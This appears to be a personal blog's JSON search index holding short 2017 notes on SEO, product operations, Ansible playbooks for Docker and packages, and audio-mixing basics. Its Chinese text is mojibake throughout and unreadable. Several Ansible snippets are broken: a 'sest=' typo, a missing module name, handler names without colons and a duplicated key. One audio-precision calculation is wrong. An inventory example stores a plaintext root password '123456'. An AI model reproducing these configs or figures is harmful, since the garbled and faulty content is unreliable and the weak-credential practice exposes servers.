ä¸€æ®µæ—¶é—´å†è´­ä¹° äº¤æ˜“å‹çš„æœç´¢è€… &quot;åˆ«åºŸè¯ï¼Œå°±è¦ä»–ï¼Œèƒ½ä¾¿å®œç‚¹ä¸ï¼Ÿ&quot; è¿™ç±»å‹çš„æœç´¢è€…ä¸€èˆ¬ä¼šæœç´¢å…·ä½“çš„å†…å®¹ï¼Œæ¯”å¦‚è¯´ ipad2ï¼Œ è‹¹æœå¹³æ¿ç”µè„‘ å¯¹äºè¿™ç±»å‹çš„æœç´¢è€…æœ€å¥½æä¾›äº§å“é¡µé¢å¹¶åŠ ä»¥ä¿ƒé”€æ‰“æŠ˜çš„ä¿¡æ¯ï¼Œæ¥å¸å¼•è¿™ç±»å‹çš„æœç´¢è€…è´­ä¹° æ¨èå·¥å…·ç«™é•¿å·¥å…·http://tool.chinaz.com ä¹¦ç±æ¨èã€Šæœç´¢å¼•æ“è¥é”€ç½‘ç«™æµé‡å¤§æé€Ÿã€‹ ã€ŠDONOT MAKE ME THINKã€‹ ã€Šç½‘ç«™ä¼˜åŒ–ã€‹ ã€Šseo å®æˆ˜å¯†ç ã€‹ ã€Šç½‘ç»œè¥é”€å®æˆ˜å¯†ç ã€‹ seoæ¯æ—¥ä¸€è´´(seo å®æˆ˜å¯†ç ä½œè€…ç½‘ç«™)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"äº§å“åä½œæµç¨‹","slug":"history/tech/5a22711b50d13d3f764ddba4","date":"2017-12-01T21:23:39.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a22711b50d13d3f764ddba4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a22711b50d13d3f764ddba4/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä¸åŒäº§å“å½¢æ€çš„çªç ´æ€§å¢é•¿å¼•æ“","slug":"history/operate/5a22601650d13d3f764ddba3","date":"2017-12-01T20:11:02.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a22601650d13d3f764ddba3/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a22601650d13d3f764ddba3/","excerpt":"","text":"å·¥å…·ç±»äº§å“çš„æˆé•¿é©±åŠ¨åŠ›ä½“éªŒ æ•ˆç‡ ç¤¾äº¤åˆ†äº«åœºæ™¯æ‰“é€š å†…å®¹ç±»äº§å“çš„æˆé•¿é©±åŠ¨åŠ›å†…å®¹å“è´¨ ç‹¬ç‰¹æ€§ äº’åŠ¨ ä¼ æ’­é€šè·¯ ä¸‰èŠ‚è¯¾: ç¤¾äº¤ç±»äº§å“çš„æˆé•¿æ°›å›´ å†…å®¹è´¨é‡ è¯é¢˜ ç¤¾äº¤ç±»äº§å“çš„æˆé•¿é©±åŠ¨åŠ›å…³ç³»é“¾ æ°›å›´ ç©æ³• å¹³å°ç±»äº§å“çš„æˆé•¿é©±åŠ¨åŠ›ç»†åˆ†ä»·å€¼ç‚¹ äº¤å‰è¡¥è´´","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"ä¸åŒä¸šåŠ¡ç±»å‹äº§å“çš„è¿è¥ä¾§é‡ç‚¹","slug":"history/operate/5a22599250d13d3f764ddba2","date":"2017-12-01T19:43:14.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a22599250d13d3f764ddba2/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a22599250d13d3f764ddba2/","excerpt":"","text":"ç½‘æ˜“äº‘éŸ³ä¹æ ¸å¿ƒä¸šåŠ¡é€»è¾‘è„‰è„‰æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä¸åŒä¸šåŠ¡ç±»å‹äº§å“çš„è¿è¥ä¾§é‡ç‚¹","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"äº§å“ç”Ÿå‘½å‘¨æœŸ","slug":"history/operate/5a224b1550d13d3f764ddba1","date":"2017-12-01T18:41:25.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a224b1550d13d3f764ddba1/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a224b1550d13d3f764ddba1/","excerpt":"","text":"","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"è¿è¥èŒä¸šå‘å±•","slug":"history/operate/5a2247e350d13d3f764ddba0","date":"2017-12-01T18:27:47.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a2247e350d13d3f764ddba0/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a2247e350d13d3f764ddba0/","excerpt":"","text":"èŒèƒ½ä¸Šåˆ†:å…¬å¸å‘å±•ä¸Šåˆ†:","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"ansible docker ä¿®æ”¹é…ç½®è‡ªåŠ¨é‡å¯","slug":"history/tech/5a20d4594b0d20bd5c4f7b59","date":"2017-12-01T04:02:33.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20d4594b0d20bd5c4f7b59/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20d4594b0d20bd5c4f7b59/","excerpt":"","text":"ansible docker ä¿®æ”¹é…ç½®è‡ªåŠ¨é‡å¯--- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: å®‰è£… docker yum: name: docker-engine state:latest - name: å¯åŠ¨ docker service: name: docker state: started #ä¸»æœºæ¯æ¬¡é‡å¯åæœåŠ¡çš„çŠ¶æ€,å¯é€‰å€¼ [started, stoped, reloaded, restarted] - name: é…ç½® docker æœåŠ¡ copy: src: ./file/docker.service dest: /etc/systemd/system/ notify: - é‡å¯ sysytemd - é‡å¯ docker handlers: - name é‡å¯ systemd command: /usr/bin/systemctl daemon-reload - name é‡å¯ docker service: name: docker state: restart æŸ¥çœ‹æœåŠ¡çŠ¶æ€:ansible all -a &quot;systemctl show docker&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible docker å®‰è£…å¯åŠ¨å¹¶è®¾ç½®å¼€æœºå¯åŠ¨","slug":"history/tech/5a20d1674b0d20bd5c4f7b58","date":"2017-12-01T03:49:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20d1674b0d20bd5c4f7b58/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20d1674b0d20bd5c4f7b58/","excerpt":"","text":"ansible docker å®‰è£…å¯åŠ¨å¹¶è®¾ç½®å¼€æœºå¯åŠ¨--- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: å®‰è£… docker yum: name: docker-engine state:latest - name: å¯åŠ¨ docker service: name: docker state: started #ä¸»æœºæ¯æ¬¡é‡å¯åæœåŠ¡çš„çŠ¶æ€,å¯é€‰å€¼ [started, stoped, reloaded, restarted]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible copy æ¨¡å—","slug":"history/tech/5a20cb354b0d20bd5c4f7b57","date":"2017-12-01T03:23:33.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20cb354b0d20bd5c4f7b57/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20cb354b0d20bd5c4f7b57/","excerpt":"","text":"vim play.yml--- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: &quot;æ‹·è´æµ‹è¯•æ–‡ä»¶&quot; copy: src: ./files/test.txt dest: /home/test","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible yum æ¨¡å—","slug":"history/tech/5a20c31c4b0d20bd5c4f7b56","date":"2017-12-01T02:49:00.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20c31c4b0d20bd5c4f7b56/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20c31c4b0d20bd5c4f7b56/","excerpt":"","text":"å®‰è£…çš„ playbook: --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: &quot;å®‰è£… epel&quot; yum: name: epel-release state: latest æµ‹è¯•ï¼šansible all -a &quot;yum repolist&quot; åˆ é™¤çš„ playbookplaybook: --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: &quot;å®‰è£… epel&quot; yum: name: epel-release state: removed","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible æ‹·è´å¯†é’¥","slug":"history/tech/5a20c2b24b0d20bd5c4f7b55","date":"2017-12-01T02:47:14.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20c2b24b0d20bd5c4f7b55/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20c2b24b0d20bd5c4f7b55/","excerpt":"","text":"playbook: --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: &quot;æ‹·è´å…¬é’¥&quot; - authorized_key: user: root key: &quot;{{lookup('file', '/root/.ssh/id_rsa.pub')}}&quot; state: present","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible playbook","slug":"history/tech/5a20c1634b0d20bd5c4f7b54","date":"2017-12-01T02:41:39.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20c1634b0d20bd5c4f7b54/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20c1634b0d20bd5c4f7b54/","excerpt":"","text":"åˆ›å»º yml æ–‡ä»¶:vim play.yml --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: &quot;æµ‹è¯•è¿æ¥&quot; ping: æ‰§è¡Œ:ansible-playbook play.yml -v","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible","slug":"history/tech/5a20bb814b0d20bd5c4f7b53","date":"2017-12-01T02:16:33.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20bb814b0d20bd5c4f7b53/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20bb814b0d20bd5c4f7b53/","excerpt":"","text":"è®¾ç½®ä¸»æœº(inventory åº“å­˜ï¼Œæ¸…å•)/etc/ansible/hosts [test] 10.0.177.[239:242] ansible_user=root ansible_ssh_pass=123456 [swarm] 10.0.177.222 [swarm:vars] ansible_user=root ansible_ssh_pass=123456 å¯ä»¥é€šè¿‡è®¾ç½®å˜é‡çš„æ–¹å¼è®¾ç½®ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿˜å¯ä»¥å•ç‹¬åˆ›å»ºæ–‡ä»¶æŒ‡å®š(æ–‡ä»¶åä½¿ç”¨ä¸»æœºç¾¤ç»„çš„åå­—)vim /etc/ansible/group_vars/swarm --- ansible_userï¼š root ansible_ssh_passï¼š123456 æ£€æŸ¥ä¸»æœºçŠ¶æ€ansible all -m ping -u [ç”¨æˆ·å] -k [å¯†ç ] ansible swarm -m ping # swarm ä¸ºç¾¤ç»„åˆ—è¡¨ ä½¿ç”¨å‘½ä»¤è¡Œæ¨¡å—ansible all --module-name=ping --user=root --ask-pass ansible all --args &quot;echo ~&quot; --user root ansible all --args &quot;echo ~&quot; --user root --become #become åˆ‡æ¢åˆ° root ç®€å†™:ansible all --a &quot;echo ~&quot; -u root -b ä½¿ç”¨ copy æ¨¡å—ansible all -m copy -a 'src=~/hello.txt sest=/home/test' -u root ansible all -a &quot;ls /home/test&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è‡ªåŠ¨åŒ–æµ‹è¯•æ¡†æ¶","slug":"history/tech/5a2116c4b97e3c720ca1a0fb","date":"2017-11-30T20:45:56.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a2116c4b97e3c720ca1a0fb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2116c4b97e3c720ca1a0fb/","excerpt":"","text":"http://appium.io","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ··éŸ³åŸºæœ¬æ¦‚å¿µ","slug":"history/music/5a210fc5b97e3c720ca1a0fa","date":"2017-11-30T20:16:05.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5a210fc5b97e3c720ca1a0fa/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5a210fc5b97e3c720ca1a0fa/","excerpt":"","text":"å£°éŸ³çš„åŸºæœ¬æ¦‚å¿µç›¸ä½ï¼šå£°éŸ³çš„æ–¹å‘å£°ç›¸:å·¦å³ä½ç½®é¢‘å“:é¢‘ç‡å“åº”åŠ¨æ€èŒƒå›´:æœ€é«˜ç”µå¹³ä¸æœ€ä½ç”µå¹³çš„å·®å€¼åŠ¨æ€ä½™é‡:ä¿ç•™ä½™é‡ï¼Œä»¥24bitä¸ºä¾‹ï¼ŒåŠ¨æ€èŒƒå›´ä¸€èˆ¬æ˜¯ 144dbä¸€èˆ¬æ¥è®²ï¼Œå“åº¦è¶Šå¤§(å“åº¦å–å†³äºå¹³å‡ç”µå¹³)ï¼ŒåŠ¨æ€è¶Šå°ã€‚ ç¼–ç dsdç¼–ç é‡‡æ ·ç²¾åº¦è¿‡é«˜ï¼Œåªæœ‰1bitï¼Œ 6dbçš„é‡‡æ ·èŒƒå›´ï¼Œ è®°å½•ä¸¤ä¸ªç‚¹çš„æŒ¯å¹…å·® psmç¼–ç é‡åŒ–ç²¾åº¦è½¯ä»¶å†…éƒ¨å¤„ç†ç²¾åº¦å¤§äº24bit 16bit ä¸Šé¢æœ‰ 8bit/db * 6db = 48db 16bit ä¸‹é¢æœ‰ 16bit/db * 6db = 96db ä¹Ÿå°±æ˜¯è¯´ æ€»çš„ç²¾åº¦æœ‰ -144 + 96 = -240 å¸¸ç”¨æ··éŸ³è®¾å¤‡ç”µè„‘ å£°å¡ asio core audio è¯ç­’ è¯ç­’æ”¾å¤§å™¨ æ•°å­—éŸ³é¢‘å·¥ä½œç«™(DAW digital audio workstation)protools studio one life makesbus ... ç›‘å¬è®¾å¤‡ ç›‘å¬éŸ³ç®±é€‰æ‹©æˆ¿é—´&lt;15m2 è¿‘åœºéŸ³ç®± æˆ¿é—´&gt;25m2 ä¸­å°è¿œåœº æˆ¿é—´ 40~50m2 ä¹‹é—´ è¿œåœº ä¸­è¿œåœºä½é¢‘è¡¨ç°å¥½ æŒ‰ç…§å–‡å­ä½ç½®åŒè½´ç›‘å¬éŸ³ç®±(å› ä¸ºå¹²æ¶‰å°ï¼Œæ‰€ä»¥ç›¸ä½å¤±çœŸå°ï¼Œå·¥ä½œå®¤ä¸»æµ) æŒ‰ç…§å€’ç›¸å­”ä½ç½®å‰å€’ç›¸å­” åå€’ç›¸å­” ç›‘å¬è€³æœºçš„é€‰æ‹©ä¸èƒ½ç”¨äºä¸»è¦çš„ç›‘å¬è®¾å¤‡ ç”¨äºå¬ç»†èŠ‚ å…¨å°é—­ å½•éŸ³å®¤ä½¿ç”¨ åŠå°é—­ åæœŸå¬ç»†èŠ‚ï¼Œå¯¹é¢‘å“è¡¨ç°æ›´å¥½ ç›‘å¬æ§åˆ¶å™¨è¦æ±‚æŸ“è‰²è¾ƒå° è¯ç­’ç”µå®¹ é€‚åˆå½•åˆ¶æ°‘æ­Œï¼Œå¦‚ u87 ç”µå­ç®¡ å£°å‹æ‰¿å—è¾ƒå°ï¼Œé€‚åˆå½•åˆ¶æµè¡Œæ­Œï¼Œå¦‚ u47 åŠ¨åœˆ å£°å‹æ‰¿å—å¥½ï¼Œé¢‘å“çª„ï¼Œå½•åˆ¶æ‘‡æ»šæ­Œæ›²ï¼Œä½œä¸ºé¼“éº¦ï¼Œå½•åˆ¶åº•é¼“ï¼Œç°åœºæ¼”å‡ºä½¿ç”¨åŠ¨åœˆï¼Œè¿‡æ»¤å™ªå£° æŒ‰ç…§æŒ¯è†œåˆ†å¤§æŒ¯è†œ å°æŒ¯è†œ å¯¹ä½é¢‘è¦æ±‚ä¸é«˜ï¼Œé€‚åˆå½•åˆ¶å‰ä»–ï¼Œå°æç´ é¼“çš„over head åšä¸ºè¡¥å……è¯ç­’ è¯ç­’æ”¾å¤§å™¨å£°å¡ä¸Šçš„è¯ç­’æ”¾å¤§å™¨ï¼Œä¸€èˆ¬ä¸ç”¨äºå½•åˆ¶ä¸»å£°éƒ¨ï¼Œå¯ä»¥ç”¨äºå½•åˆ¶é¼“ ç”µå­ç®¡æ”¾å¤§å™¨æŸ“è‰²å¥½ï¼Œå£°å‹æ‰¿å—ä½ï¼Œæ™¶ä½“ç®¡é€ ä»·ä¾¿å®œ æ•°å­—ä¸»æ—¶é’Ÿ æ•ˆæœå™¨å‹ç¼©å™¨æ”¹å˜å£°éŸ³çš„åŠ¨æ€EQæ”¹å˜å£°éŸ³çš„é¢‘ç‡ï¼Œé¢‘ç‡åˆ†å¸ƒæ··å“å¸Œæœ›èº«å¤„ç©ºé—´çš„æè¿° å‹ç¼©å™¨æ™¶ä½“ç®¡ï¼š ç»“å®ï¼Œæ›´å¤šçš„å‹ç¼©ç—•è¿¹ å…‰å­¦: å‹ç¼©åŠ¨æ€æ¯”è¾ƒå¤§çš„ï¼Œå¦‚äººå£°ç­‰ï¼Œæœ€å°çš„å‹ç¼©ç—•è¿¹ ç”µå­ç®¡: æŸ“è‰²å¤§ï¼Œè®©å£°éŸ³å…·æœ‰æ›´å¤šçš„å¼¹æ€§å’Œç”œç¾åº¦ï¼Œä¾‹å¦‚é‡‘å±éŸ³è‰²æ›´éœ€è¦æ¸©æš– EQå£°éŸ³é£æ ¼ å£°éŸ³åŠ›åº¦ å¦‚ä½•æµ‹é‡æˆ¿é—´å£°å­¦ç‰¹æ€§ä½¿ç”¨ç²‰çº¢å™ªå£°(ç²‰çº¢å™ªå£°æ˜¯ä¸€ç§å…¨é¢‘æ®µå™ªå£°) + æµ‹é‡è¯ç­’è®¾å¤‡ä¸Šè‡ªå¸¦çš„ EQ æ ¡æ­£ä¼šå¸¦æ¥ç›¸ä½å¤±çœŸ","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"ansible è§’è‰²(roles)","slug":"history/tech/5a20fca84b0d20bd5c4f7b62","date":"2017-11-30T18:54:32.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20fca84b0d20bd5c4f7b62/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20fca84b0d20bd5c4f7b62/","excerpt":"","text":"åˆ›å»ºè§’è‰²:mkdir roles cd roles ansible-galaxy init docker æ–‡ä»¶å¤¹ä»‹ç»default: é»˜è®¤çš„å˜é‡ files: ä»»åŠ¡éœ€è¦çš„æ–‡ä»¶ handlers: ä»»åŠ¡éœ€è¦çš„å¤„ç†å™¨ meta: è§’è‰²ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´è§’è‰²çš„ä¾èµ– tasks: è§’è‰²çš„ä»»åŠ¡ templates: è§’è‰²éœ€è¦ç”¨åˆ°çš„ä¸€äº›æ–‡ä»¶æ¨¡æ¿ tests: æµ‹è¯• vars: æ˜¯ä¸€äº›å˜é‡","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible åŒ…å«æ–‡ä»¶","slug":"history/tech/5a20fa704b0d20bd5c4f7b61","date":"2017-11-30T18:45:04.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20fa704b0d20bd5c4f7b61/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20fa704b0d20bd5c4f7b61/","excerpt":"","text":"include:--- - name: ansible playbook hosts: all remote_user: root become: yes vars: user_name: 'test' var_files: tasks: - include: test.yml test.yml: --- - name: å¸¸ç”¨å·¥å…· yum: nameï¼š '{{ item }}' state: latest with_items: - tree - zip tags: - common","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible æ¨¡æ¿","slug":"history/tech/5a20f9784b0d20bd5c4f7b60","date":"2017-11-30T18:40:56.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20f9784b0d20bd5c4f7b60/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20f9784b0d20bd5c4f7b60/","excerpt":"","text":"play.yml--- - name: ansible playbook hosts: all remote_user: root become: yes vars: docker_registry_mirror: 'https://xxx.mirror.aliyun.com' var_files: tasks: - name: æ‹·è´æ–‡ä»¶ template: src: ./files/docker.service.j2 dest: /etc/systemd/system/ æ¨¡æ¿æ–‡ä»¶ï¼š./files/docker.service.j2 ... --registry-mirror = {{ docker_registry_mirror }} ...","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible å‘½ä»¤è¡Œä½¿ç”¨æ¨¡å—","slug":"history/tech/5a20f7cb4b0d20bd5c4f7b5f","date":"2017-11-30T18:33:47.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20f7cb4b0d20bd5c4f7b5f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20f7cb4b0d20bd5c4f7b5f/","excerpt":"","text":"åˆ é™¤dockeransible all -m -a 'name=docker-engine state=absent' åˆ é™¤ docker-engine-selinuxansible all -m -a 'name=docker-engine-selinux state=absent' åˆ é™¤æ–‡ä»¶ansible all -m file -a 'path=/etc/yum.repos.d/docker-testing.repo state=absent' -u test -b","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible å¾ªç¯","slug":"history/tech/5a20f5614b0d20bd5c4f7b5e","date":"2017-11-30T18:23:29.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20f5614b0d20bd5c4f7b5e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20f5614b0d20bd5c4f7b5e/","excerpt":"","text":"å®‰è£…é€šç”¨è½¯ä»¶--- - name: ansible playbook hosts: all remote_user: root become: yes vars: user_name: 'test' var_files: tasks: - name: å¸¸ç”¨å·¥å…· yum: nameï¼š '{{ item }}' state: latest with_items: - tree - zip tags: - common hash ç±»å‹--- - name: ansible playbook hosts: all remote_user: root become: yes vars: user_name: 'test' var_files: tasks: - name: å¸¸ç”¨å·¥å…· yum: nameï¼š '{{ item.name }}' state: '{{ item.state }}' state: latest with_items: - {name: tree, state: latest} - {name: zip, state: latest} tags: - common","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible æ¡ä»¶åˆ¤æ–­","slug":"history/tech/5a20f4434b0d20bd5c4f7b5d","date":"2017-11-30T18:18:43.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20f4434b0d20bd5c4f7b5d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20f4434b0d20bd5c4f7b5d/","excerpt":"","text":"ansible æ”¶é›†è¿œç¨‹ä¸»æœºçš„ä¸€äº›ä¿¡æ¯:ansible all -m setup 